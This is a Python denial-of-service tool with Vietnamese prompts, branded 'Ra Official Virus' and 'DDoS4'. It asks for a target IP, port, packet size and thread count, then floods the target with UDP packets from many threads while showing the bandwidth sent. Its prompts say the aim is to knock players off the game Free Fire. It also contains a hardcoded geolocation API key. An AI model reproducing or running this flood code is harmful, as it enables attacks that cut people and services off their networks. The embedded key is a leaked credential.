from socket import socket, AF_INET, SOCK_DGRAM
import os
from threading import Thread
from random import choices, randint
from time import time, sleep
import requests
from pystyle import *
from getpass import getpass as hinput
def get_ip_info(ip_addr, api_key):
    url = f"http://api.ipstack.com/{ip_addr}?access_key={api_key}"
    response = requests.get(url)
    data = response.json()
    return data
import datetime
def check():
    ip_address = requests.get('https://api.ipify.org').text
    YOUR_API_KEY = "f8f7016e2d0d474c6f68ad42ce4db926"
    ip_info = get_ip_info(ip_address, YOUR_API_KEY)
    print(f"\033[33m╔═══════════════════════════════════════════════════════╗")
    print(f"\033[33m║\033[34mĐịa Chỉ IP:\033[32m {ip_address}")
    print(f"\033[33m║\033[34mKinh Độ:\033[32m {ip_info['longitude']}")
    print(f"\033[33m║\033[34mVĩ Độ:\033[32m {ip_info['latitude']}")
    print(f"\033[33m║\033[34mKhu Vực:\033[32m {ip_info['region_name']}")
    print(f"\033[33m║\033[34mQuốc Gia:\033[32m {ip_info['country_name']}")
    print(f"\033[33m║\033[34mThành Phố:\033[32m {ip_info['city']}")
    print(f"\033[33m║\033[34mMã Vùng:\033[32m {ip_info['zip']}")
    print(f"\033[33m╚═══════════════════════════════════════════════════════╝")
now = datetime.datetime.now()
formatted_date = now.strftime("%d/%m/%Y %H:%M:%S")



banner = r"""


 

                   ██▒   █▓ ██▓ ██▀███   █    ██   ██████    
                   ▓██░   █▒▓██▒▓██ ▒ ██▒ ██  ▓██▒▒██    ▒    
                    ▓██  █▒░▒██▒▓██ ░▄█ ▒▓██  ▒██░░ ▓██▄
                     ▒██ █░░░██░▒██▀▀█▄  ▓▓█  ░██░  ▒   ██▒
                      ▒▀█░  ░██░░██▓ ▒██▒▒▒█████▓ ▒██████▒▒     
                      ░ ▐░  ░▓  ░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ 
                      ░ ░░   ▒ ░  ░▒ ░ ▒░░░▒░ ░ ░ ░ ░▒  ░ 
                        ░░   ▒ ░  ░░   ░  ░░░ ░ ░ ░  ░  ░       
                         ░   ░     ░        ░           ░                    
                        ░                                                                  

                                                                                 
                            ENTER ĐỂ VÀO TOOL                                
"""

Anime.Fade(Center.Center(banner), Colors.blue_to_green, Colorate.Vertical, enter=True)
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System


class Brutalize:

    def __init__(self, ip, port, force, threads):
        self.ip = ip
        self.port = port
        self.force = force # default: 1250
        self.threads = threads # default: 100

        self.client = socket(family=AF_INET, type=SOCK_DGRAM)
        # self.data = self._randbytes()
        self.data = str.encode("x" * self.force)
        self.len = len(self.data)

    def flood(self):
        self.on = True
        self.sent = 0
        for _ in range(self.threads):
            Thread(target=self.send).start()
        Thread(target=self.info).start()
    
    def info(self):

        interval = 0.05
        now = time()

        size = 0
        self.total = 0

        bytediff = 8
        mb = 1000000
        gb = 1000000000
        

        while self.on:
            sleep(interval)
            if not self.on:
                break

            if size != 0:
                self.total += self.sent * bytediff / gb * interval
                print(stage(f"{fluo}{round(size)} {white}Mb/s {purple}-{white} Total: {fluo}{round(self.total, 1)} {white}Gb. {' '*20}"), end='\r')

            now2 = time()
        
            if now + 1 >= now2:
                continue
            
            size = round(self.sent * bytediff / mb)
            self.sent = 0

            now += 1

    def stop(self):
        self.on = False

    def send(self):
        while self.on:
            try:
                self.client.sendto(self.data, self._randaddr())
                self.sent += self.len
            except:
                pass
    def _randaddr(self):
        return (self.ip, self._randport())

    def _randport(self):
        return self.port or randint(1, 65535)


os.system("cls" if os.name == "nt" else "clear")
blue = Col.light_blue
lblue = Colors.StaticMIX((Col.light_green, Col.white, Col.white))
red = Colors.StaticMIX((Col.green, Col.white, Col.white))
def format_print1(text):
    return f"""                       {lblue}{text}{Col.reset}"""

def format_input1(text):
    return f"""                       {lblue}{text}{Col.reset}"""
def format_print(symbol, text):
    return f"""                      {Col.Symbol(symbol, lblue, blue)} {lblue}{text}{Col.reset}"""

def format_input(symbol, text):
    return f"""                      {Col.Symbol(symbol, red, blue)} {red}{text}{Col.reset}"""
ascii = r'''
┌─────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                                                                                 │
│                              ██╗   ██╗██╗██████╗ ██╗   ██╗███████╗                              │
│                              ██║   ██║██║██╔══██╗██║   ██║██╔════╝                              │
│                              ██║   ██║██║██████╔╝██║   ██║███████╗                              │
│                              ╚██╗ ██╔╝██║██╔══██╗██║   ██║╚════██║                              │
│                               ╚████╔╝ ██║██║  ██║╚██████╔╝███████║                              │
│                                ╚═══╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝                              │
│                                                                           Ra Official Virus     │
└─────────────────────────────────────────────────────────────────────────────────────────────────┘
  '''
  

print(Colorate.Vertical(Colors.DynamicMIX((Col.white, Col.yellow)), Center.XCenter(ascii.center(100))))
banner = r"""
     Mod By: Ra Official Virus - Thạch Mô Ra - Khanh Lâm - Thoại Killua - Minh Thuận - Quaw Baw - Lai Plus - Tr Văn Tý""".replace('▓', '▀')
check()
fluo = Col.light_red
fluo2 = Col.light_blue
white = Col.white

blue = Col.StaticMIX((Col.blue, Col.black))
bpurple = Col.StaticMIX((Col.purple, Col.black, blue))
purple = Col.StaticMIX((Col.purple, blue, Col.white))

fluo = Col.light_green
fluo2 = Col.light_blue
white = Col.yellow

blue = Col.light_blue
lblue = Colors.StaticMIX((Col.light_green, Col.white, Col.white))
red = Colors.StaticMIX((Col.green, Col.white, Col.white))


def init():
    System.Size(140, 40)                                                                                                                                                                                                                                                                   ,System.Title(".D.D.O.S.4. .-. .b.y. .R.A.O.F.F.I.C.I.A.L.V.I.R.U.S".replace('.',''))
    Cursor.HideCursor()


init()


def stage(text, symbol = '...'):
    col1 = purple
    col2 = white
    return f" {Col.Symbol(symbol, col2, col1, '{', '}')} {col2}{text}"

def error(text, start='\n'):
    hinput(f"{start} {Col.Symbol('!', fluo, white)} {fluo}{text}")
    exit()


def main():
    print()
    
    print(Colorate.Vertical(Colors.DynamicMIX((Col.light_green, Col.light_blue)), Center.XCenter(banner)))

    ip = input(stage(f"Nhập IP Muốn Đấm Cho Khỏi Chơi Free Fire :) {purple}->{fluo2} ", '+'))
    print()

    try:
        if ip.count('.') != 3:
            int('error')
        int(ip.replace('.',''))
    except:
        error("Lỗi Rồi! Vui Lòng Nhập IP Đúng.")



    port = input(stage(f"Nhập PORTS {purple}[{white}Press {fluo2}Enter{white} Đấm All PORTS{purple}] {purple}->{fluo2} ", '?'))
    print()

    if port == '':
        port = None 
    else:
        try:
            port = int(port)
            if port not in range(1, 65535 + 1):
                int('error')
        except ValueError:
            error("Lỗi Rồi! Vui Lòng Nhập PORTS Đúng")

    force = input(stage(f"Bytes Per Packet {purple}[{white}Press {fluo2}Enter{white} For 1250{purple}] {purple}->{fluo2} ", '?'))
    print()

    if force == '':
        force = 1250
    else:
        try:
            force = int(force)
        except ValueError:
            error("Lỗi! Vui Lòng Nhập Force.")


    threads = input(stage(f"Nhập Threads {purple}[{white}Press {fluo2}Enter{white} For 100{purple}] {purple}->{fluo2} ", '?'))
    print()

    if threads == '':
        threads = 100
    else:
        try:
            threads = int(threads)
        except ValueError:
            error("Lỗi! Vui Lòng Nhập Luồng.")


    print()
    cport = '' if port is None else f'{purple}:{fluo2}{port}'
    print(stage(f"Bắt Đầu Đấm Cho KHỎI Chơi FREE FIRE Nè: {fluo2}{ip}{cport}{white}."), end='\r')


    brute = Brutalize(ip, port, force, threads)
    try:
        brute.flood()
    except:
        brute.stop()
        error("Một Lỗi Nghiêm Trọng Đã Xảy Ra Và Cuộc Tấn Công Đã Bị Dừng Lại.", '')
    try:
        while True:
            sleep(1000000)
    except KeyboardInterrupt:
        brute.stop()
        print(stage(f"Đã Ngừng Đấm. {fluo2}{ip}{cport}{white} Đã Bị Đấm Bởi Ra Official Vius {fluo}{round(brute.total, 1)} {white}Gb.", '.'))
    print('\n')
    sleep(1)

    hinput(stage(f"Press {fluo2}enter{white} to {fluo}exit{white}.", '.'))



if __name__ == '__main__':
    main()    